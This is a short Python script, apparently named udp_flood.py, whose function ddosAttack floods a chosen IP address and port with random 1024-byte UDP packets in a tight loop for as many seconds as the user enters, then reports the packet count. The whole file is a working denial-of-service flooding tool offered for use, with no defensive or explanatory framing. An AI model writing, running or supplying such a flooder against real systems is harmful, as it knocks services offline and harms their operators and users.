import random, socket, threading, sys, time, getopt

class UDP_packet:
	def __init__(self, dest_ip, dest_port):
		self.dest_ip = dest_ip
		self.dest_port = dest_port
		try:
			self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		except:
			print('Make pakcet error!')
			sys.exit(1)

	def send_socket(self):
		data = random._urandom(1024)
		try:
			self.socket.sendto(data, (self.dest_ip, self.dest_port))
		except:
			print("Sending packet error!")
			exit(1)


def ddosAttack(argv):
    try :
        opts, args = getopt.getopt(argv,"rs:",["random=,specific="])
    except getopt.GetoptError:
        print('udp_flood.py -r <DestinationIp> <DestinationPort>')
        sys.exit(2)

    try :
        udp = UDP_packet(dest_ip=str(args[0]), dest_port=int(args[1]))
    except :
        print('udp_flood.py -r <DestinationIp> <DestinationPort>')
        sys.exit(2)

    end = input('How much seconds do you want?')
    start = time.time()
    end = start + float(end)

    count = 0 #to check how many packet was maden

    #do until time over
    while time.time() < end:
        udp.send_socket()
        count += 1
    print(str(count) + " packets are sent")

if __name__ == "__main__":
    ddosAttack(sys.argv[1:])
